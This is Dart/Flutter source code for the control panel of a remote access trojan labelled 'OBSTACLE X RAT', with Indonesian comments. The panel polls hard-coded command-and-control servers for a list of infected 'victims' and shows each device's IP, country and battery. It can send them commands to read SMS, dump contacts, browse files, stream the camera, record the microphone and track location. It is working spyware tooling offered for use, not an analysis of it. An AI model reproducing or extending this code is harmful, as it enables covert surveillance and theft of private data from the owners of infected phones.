import 'dart:async';
import 'dart:convert';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;

class RatPage extends StatefulWidget {
  final String sessionKey;
  final String username;

  const RatPage({
    super.key,
    required this.sessionKey,
    required this.username,
  });

  @override
  State<RatPage> createState() => _RatPageState();
}

class _RatPageState extends State<RatPage> with TickerProviderStateMixin {
  // --- KONFIGURASI DOMAIN PANEL ANDA ---
  final String baseUrl = "http://rezagtnk.spaced.my.id:9130";

  // --- TEMA WARNA HACKER ---
  final Color primaryDark = const Color(0xFF050505);
  final Color cardBg = const Color(0xFF0F0F0F);
  final Color accentGreen = const Color(0xFF00FF41); // Hijau Matrix
  final Color accentRed = const Color(0xFFFF2A2A);   // Merah Error
  final Color accentBlue = const Color(0xFF00F0FF); // Cyan Data
  final Color textMain = Colors.white;
  final Color textSub = Colors.white54;

  List<dynamic> _victims = [];
  bool _isLoading = true;
  String _statusMessage = "Initializing C2 Connection...";
  Timer? _pollingTimer;

  late AnimationController _listAnimController;

  @override
  void initState() {
    super.initState();
    _listAnimController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 800),
    );

    // Panggil data pertama kali
    _fetchVictims();

    // Setup Auto-Refresh setiap 5 detik untuk update status victim
    _pollingTimer = Timer.periodic(const Duration(seconds: 5), (timer) {
      if (mounted) {
        _fetchVictims(isBackground: true);
      }
    });
  }

  @override
  void dispose() {
    _pollingTimer?.cancel();
    _listAnimController.dispose();
    super.dispose();
  }

  // --- FUNGSI API: MENGAMBIL DAFTAR VICTIM ---
  Future<void> _fetchVictims({bool isBackground = false}) async {
    if (!isBackground) {
      setState(() => _isLoading = true);
    }

    try {
      // Ganti endpoint '/getVictims' jika berbeda di server Anda
      final response = await http.get(
        Uri.parse("http://arullll.private-rexy.web.id:11235/api/rat/getVictims?key=${widget.sessionKey}"),
      ).timeout(const Duration(seconds: 10));

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        
        // Cek struktur data (List langsung atau di dalam key 'victims')
        final List victimsList = data is List ? data : (data['victims'] ?? data['data'] ?? []);

        if (mounted) {
          setState(() {
            _victims = victimsList;
            _isLoading = false;
            _statusMessage = "Connected to C2 Server";
            if (!isBackground) _listAnimController.forward();
          });
        }
      } else {
        _handleError("Server responded: ${response.statusCode}", isBackground);
      }
    } catch (e) {
      _handleError("Connection failed: ${e.toString()}", isBackground);
    }
  }

  // --- FUNGSI API: KIRIM PERINTAH KE VICTIM ---
  Future<void> _sendCommand(String deviceId, String command) async {
    // Optimistic Update (Langsung tutup sheet agar terasa cepat)
    Navigator.pop(context);
    _showSnackBar("Sending payload: $command...", success: true);

    try {
      // Ganti endpoint '/sendCommand' jika berbeda di server Anda
      final response = await http.post(
        Uri.parse("http://arullll.private-rexy.web.id:11235/api/rat/sendCommand"),
        body: {
          "key": widget.sessionKey,
          "device_id": deviceId,
          "command": command,
        },
      );

      if (response.statusCode == 200) {
        _showSnackBar("Payload executed successfully!", success: true);
      } else {
        _showSnackBar("Payload rejected by target.", success: false);
      }
    } catch (e) {
      _showSnackBar("Error sending payload.", success: false);
    }
  }

  void _handleError(String message, bool isBackground) {
    if (!isBackground && mounted) {
      setState(() {
        _isLoading = false;
        _statusMessage = message;
      });
    }
  }

  void _showSnackBar(String message, {required bool success}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            Icon(success ? Icons.check_circle : Icons.error, color: success ? accentGreen : accentRed, size: 18),
            const SizedBox(width: 10),
            Expanded(child: Text(message, style: const TextStyle(color: Colors.white, fontFamily: 'ShareTechMono'))),
          ],
        ),
        backgroundColor: cardBg,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12), side: BorderSide(color: Colors.white.withOpacity(0.1))),
        margin: const EdgeInsets.all(20),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: primaryDark,
      appBar: _buildAppBar(),
      body: _buildBody(),
      floatingActionButton: _buildActionButtons(),
    );
  }

  // --- APP BAR DESIGN ---
  PreferredSizeWidget _buildAppBar() {
    return AppBar(
      backgroundColor: Colors.transparent,
      elevation: 0,
      centerTitle: true,
      leading: IconButton(
        icon: Icon(Icons.arrow_back_ios_new, color: textMain),
        onPressed: () => Navigator.pop(context),
      ),
      title: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Icon(Icons.bug_report_rounded, color: accentRed, size: 22),
          const SizedBox(width: 8),
          ShaderMask(
            shaderCallback: (bounds) => LinearGradient(colors: [accentRed, Colors.orange]).createShader(bounds),
            child: const Text(
              "OBSTACLE X RAT",
              style: TextStyle(fontSize: 20, fontWeight: FontWeight.w900, color: Colors.white, letterSpacing: 2),
            ),
          ),
        ],
      ),
      actions: [
        IconButton(
          icon: Icon(Icons.refresh, color: textSub),
          onPressed: () => _fetchVictims(),
        ),
      ],
    );
  }

  // --- BODY UTAMA ---
  Widget _buildBody() {
    return Column(
      children: [
        _buildHeaderStats(),
        Expanded(
          child: _isLoading
              ? _buildLoadingState()
              : _victims.isEmpty
                  ? _buildEmptyState()
                  : _buildVictimList(),
        ),
      ],
    );
  }

  Widget _buildLoadingState() {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          SizedBox(
            width: 60,
            height: 60,
            child: CircularProgressIndicator(
              color: accentGreen,
              strokeWidth: 2,
            ),
          ),
          const SizedBox(height: 20),
          Text(_statusMessage, style: TextStyle(color: textSub, fontFamily: 'ShareTechMono')),
          const SizedBox(height: 5),
          Text("Target: http://arullll.private-rexy.web.id:11235", style: TextStyle(color: Colors.white24, fontSize: 10)),
        ],
      ),
    );
  }

  Widget _buildEmptyState() {
    return Center(
      child: Padding(
        padding: const EdgeInsets.all(30.0),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.phonelink_erase_rounded, color: Colors.white24, size: 60),
            const SizedBox(height: 20),
            const Text(
              "No Victims Found",
              style: TextStyle(color: Colors.white, fontSize: 18, fontWeight: FontWeight.bold),
            ),
            const SizedBox(height: 10),
            Text(
              "Waiting for target to install payload...\nServer is listening on port 3315.",
              textAlign: TextAlign.center,
              style: TextStyle(color: textSub, fontSize: 13),
            ),
          ],
        ),
      ),
    );
  }

  // --- HEADER STATS ---
  Widget _buildHeaderStats() {
    int onlineCount = _victims.where((v) => (v['status'] ?? 'offline').toString().toLowerCase() == 'online').length;
    int offlineCount = _victims.length - onlineCount;

    return Container(
      margin: const EdgeInsets.all(16),
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: Colors.white.withOpacity(0.03),
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: Colors.white.withOpacity(0.08)),
        boxShadow: [
          BoxShadow(color: accentGreen.withOpacity(0.05), blurRadius: 20, spreadRadius: -5),
        ],
      ),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceAround,
        children: [
          _buildStatItem("TOTAL", _victims.length.toString(), accentBlue),
          Container(width: 1, height: 40, color: Colors.white24),
          _buildStatItem("ONLINE", onlineCount.toString(), accentGreen),
          Container(width: 1, height: 40, color: Colors.white24),
          _buildStatItem("OFFLINE", offlineCount.toString(), accentRed),
        ],
      ),
    );
  }

  Widget _buildStatItem(String label, String value, Color color) {
    return Column(
      children: [
        Text(value, style: TextStyle(fontSize: 28, fontWeight: FontWeight.bold, color: color)),
        const SizedBox(height: 4),
        Text(label, style: TextStyle(fontSize: 11, color: Colors.white.withOpacity(0.5), letterSpacing: 1, fontFamily: 'ShareTechMono')),
      ],
    );
  }

  // --- LIST VICTIM ---
  Widget _buildVictimList() {
    return ListView.builder(
      padding: const EdgeInsets.only(bottom: 80, left: 16, right: 16),
      itemCount: _victims.length,
      itemBuilder: (context, index) {
        final victim = _victims[index];
        // Animasi Slide In
        return SlideTransition(
          position: Tween<Offset>(
            begin: const Offset(1, 0),
            end: Offset.zero,
          ).animate(CurvedAnimation(
            parent: _listAnimController,
            curve: Interval((index * 0.1).clamp(0.0, 1.0), 1.0, curve: Curves.easeOutCubic),
          )),
          child: _buildVictimCard(victim),
        );
      },
    );
  }

  Widget _buildVictimCard(Map<String, dynamic> victim) {
    // Mapping Data JSON (Sesuaikan Key ini dengan API Anda!)
    String status = victim['status'] ?? "Offline";
    bool isOnline = status.toString().toLowerCase() == "online";
    Color statusColor = isOnline ? accentGreen : accentRed;

    String deviceName = victim['device'] ?? victim['model'] ?? 'Unknown Device';
    String ip = victim['ip'] ?? victim['last_ip'] ?? '0.0.0.0';
    String country = victim['country'] ?? 'Unknown';
    String battery = victim['battery'] ?? 'N/A';
    String deviceId = victim['device_id'] ?? victim['id'] ?? 'null';

    return GestureDetector(
      onTap: () => _showActionSheet(deviceId, deviceName, ip, isOnline),
      child: Container(
        margin: const EdgeInsets.only(bottom: 12),
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: cardBg,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: statusColor.withOpacity(0.3)),
          boxShadow: [
            BoxShadow(color: Colors.black.withOpacity(0.3), blurRadius: 8, offset: const Offset(0, 4)),
          ],
        ),
        child: Row(
          children: [
            // AVATAR
            Container(
              width: 50,
              height: 50,
              decoration: BoxDecoration(
                color: statusColor.withOpacity(0.1),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: statusColor.withOpacity(0.3)),
              ),
              child: Center(
                child: Icon(Icons.phone_android_rounded, color: statusColor, size: 28),
              ),
            ),
            const SizedBox(width: 16),

            // INFO
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Flexible(
                        child: Text(
                          deviceName,
                          overflow: TextOverflow.ellipsis,
                          style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 15),
                        ),
                      ),
                      const SizedBox(width: 8),
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                        decoration: BoxDecoration(
                          color: statusColor.withOpacity(0.2),
                          borderRadius: BorderRadius.circular(4),
                        ),
                        child: Text(
                          status.toUpperCase(),
                          style: TextStyle(color: statusColor, fontSize: 9, fontWeight: FontWeight.bold),
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 6),
                  Row(
                    children: [
                      Icon(Icons.location_on, color: Colors.white38, size: 12),
                      const SizedBox(width: 4),
                      Text(country, style: TextStyle(color: textSub, fontSize: 12)),
                      const SizedBox(width: 12),
                      Icon(Icons.battery_full, color: Colors.white38, size: 12),
                      const SizedBox(width: 4),
                      Text("$battery%", style: TextStyle(color: textSub, fontSize: 12)),
                    ],
                  ),
                ],
              ),
            ),

            // IP ADDRESS
            Text(
              ip,
              style: TextStyle(color: accentBlue, fontSize: 13, fontWeight: FontWeight.bold, fontFamily: 'ShareTechMono'),
            ),
          ],
        ),
      ),
    );
  }

  // --- FLOATING BUTTONS ---
  Widget _buildActionButtons() {
    return Row(
      mainAxisSize: MainAxisSize.min,
      children: [
        FloatingActionButton(
          heroTag: "refresh",
          mini: true,
          backgroundColor: Colors.white.withOpacity(0.1),
          child: Icon(Icons.refresh, color: accentBlue),
          onPressed: _fetchVictims,
        ),
        const SizedBox(width: 10),
        FloatingActionButton.extended(
          heroTag: "listen",
          onPressed: () {
            _showSnackBar("Listener started on port 3315", success: true);
          },
          label: const Text("Listen Port", style: TextStyle(fontWeight: FontWeight.bold)),
          icon: const Icon(Icons.settings_input_antenna),
          backgroundColor: accentBlue.withOpacity(0.2),
          foregroundColor: accentBlue,
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        ),
      ],
    );
  }

  // --- ACTION SHEET (CONTROL PANEL) ---
  void _showActionSheet(String deviceId, String deviceName, String ip, bool isOnline) {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      builder: (_) => BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 5, sigmaY: 5),
        child: Container(
          padding: const EdgeInsets.all(20),
          decoration: BoxDecoration(
            color: primaryDark,
            borderRadius: const BorderRadius.vertical(top: Radius.circular(30)),
            border: Border.all(color: Colors.white.withOpacity(0.1)),
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(width: 40, height: 4, decoration: BoxDecoration(color: Colors.grey[700], borderRadius: BorderRadius.circular(10))),
              const SizedBox(height: 20),
              Text(
                deviceName,
                style: const TextStyle(color: Colors.white, fontSize: 18, fontWeight: FontWeight.bold),
              ),
              Text(
                ip,
                style: TextStyle(color: accentBlue, fontFamily: 'ShareTechMono'),
              ),
              if (!isOnline) 
                Padding(
                  padding: const EdgeInsets.all(8.0),
                  child: Text("(Offline - Commands will be queued)", style: TextStyle(color: Colors.orange[700], fontSize: 11)),
                ),
              const SizedBox(height: 25),
              Row(
                mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                children: [
                  _buildActionButton(Icons.message, "Read SMS", accentGreen, () => _sendCommand(deviceId, "read_sms")),
                  _buildActionButton(Icons.contacts, "Contacts", accentBlue, () => _sendCommand(deviceId, "get_contacts")),
                  _buildActionButton(Icons.folder, "Files", Colors.orange, () => _sendCommand(deviceId, "file_manager")),
                ],
              ),
              const SizedBox(height: 15),
              Row(
                mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                children: [
                  _buildActionButton(Icons.camera_alt, "Camera", Colors.purple, () => _sendCommand(deviceId, "stream_camera")),
                  _buildActionButton(Icons.mic, "Mic", Colors.pink, () => _sendCommand(deviceId, "record_mic")),
                  _buildActionButton(Icons.location_on, "Location", Colors.redAccent, () => _sendCommand(deviceId, "get_location")),
                ],
              ),
              const SizedBox(height: 20),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildActionButton(IconData icon, String label, Color color, VoidCallback onTap) {
    return InkWell(
      onTap: onTap,
      borderRadius: BorderRadius.circular(50),
      child: Padding(
        padding: const EdgeInsets.all(8.0),
        child: Column(
          children: [
            Container(
              padding: const EdgeInsets.all(14),
              decoration: BoxDecoration(
                color: color.withOpacity(0.1),
                shape: BoxShape.circle,
                border: Border.all(color: color.withOpacity(0.3)),
              ),
              child: Icon(icon, color: color, size: 24),
            ),
            const SizedBox(height: 8),
            Text(label, style: TextStyle(color: Colors.white.withOpacity(0.7), fontSize: 11)),
          ],
        ),
      ),
    );
  }
}
